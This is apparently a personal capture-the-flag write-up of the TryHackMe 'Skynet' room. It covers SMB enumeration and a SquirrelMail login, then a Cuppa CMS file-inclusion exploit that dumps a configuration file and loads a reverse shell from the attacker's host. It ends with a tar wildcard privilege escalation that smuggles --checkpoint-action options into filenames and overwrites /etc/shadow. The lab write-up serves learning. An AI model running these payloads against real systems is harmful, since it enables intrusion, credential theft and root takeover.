#smb #remote-file-inclusion #rfi #tar-wildcard

https://tryhackme.com/r/room/skynet
SMB Enumeration [document](https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/)

---

Vulnerable squirrelmail on /squirrelmail. [Exploit here](https://legalhackers.com/advisories/SquirrelMail-Exploit-Remote-Code-Exec-CVE-2017-7692-Vuln.html)

#### Nmap
![[Screenshot_2024-05-23_16-47-57.png]]

I used `smbmap` to enumerate samba share drives:
```shell
smbmap -H 10.10.73.82
```
![[Screenshot_2024-05-24_18-09-14.png]]

The user `anonymous`(no password) is on `READ ONLY` so I connected to it:
```shell
smbclient //10.10.73.82/anonymous
```

I downloaded 4 files from the smb server:
**`attention.txt`**:
```text
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this. 
-Miles Dyson
```

`log1.txt` had a terminator wordlist, probably a password list

`log2.txt` and `log3.txt` were empty

Then I decided to enumerate the port `80` with `gobuster`:
```shell
gobuster dir -u http://10.10.73.82 -w /usr/share/wordlists/dirbuster/[list.txt] -t 200 -x php,txt
```

![[Screenshot_2024-05-24_18-00-10.png]]

I used the credentials `milesdyson:cyborg007haloterminator` for the `/squirrelmail` login page

There is a mail telling a new smb password for `milesdyson` => )s{A&2Z=F^n_E.B\`:
```shell
smbclient -U "WORKGROUP\milesdyson" //10.10.73.82/milesdyson
```

I found a hidden directory for the port `80` in the file `important.txt` on miles' smb:
```text
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

I enumerated the `/45kra24zxs28v3yd` directory and I've found the `/administrator` directory which I've enumerated too:
![[Screenshot_2024-05-24_19-06-20.png]]

This use `Cuppa CMS` and I've found a `Remote File Inclusion` CVE [here](https://www.exploit-db.com/exploits/25971)

I used the following link to dump the `Configuration.php` file in `base 64`:
```text
http://10.10.73.82/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
```

And here is the `Configuration.php` file:
```php
<?php 
	class Configuration{
		public $host = "localhost";
		public $db = "cuppa";
		public $user = "root";
		public $password = "password123";
		public $table_prefix = "cu_";
		public $administrator_template = "default";
		public $list_limit = 25;
		public $token = "OBqIPqlFWf3X";
		public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
		public $upload_default_path = "media/uploadsFiles";
		public $maximum_file_size = "5242880";
		public $secure_login = 0;
		public $secure_login_value = "";
		public $secure_login_redirect = "";
	} 
```

Then I did setup a reverse shell through the RFI vulnerability:
```text
http://10.10.73.82/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.14.79.56:5050/shell.php
```

And here I am in

#### Tar wildcard privilege escalation

So, for getting root, I had to exploit a `tar wildcard` PE vector, here is the vulnerable script:
```shell
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

So I had to trick the wildcards by creating 2 files that will be executed as flag in the `/var/www/html` directory:
```shell
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh bash.sh'
```

So it will be executed like this:
```shell
tar cf /home/milesdyson/backups/backup.tgz --checkpoint=1 --checkpoint-action=exec=sh bash.sh [... and the rest of the legit files]
```

So I created the `bash.sh` file in 2 steps:
*Step 1*
```shell
#!/bin/bash
cp /etc/shadow /tmp/shadow
```
I modified the `/tmp/shadow` with a new root password:
```shell
openssl passwd -6 -salt 'salt' 'password'
```
*Step 2*
```shell
#!/bin/bash
cp /tmp/shadow /etc/shadow
```

Then `su root` or `shh root@10.10.73.82` and here I am root

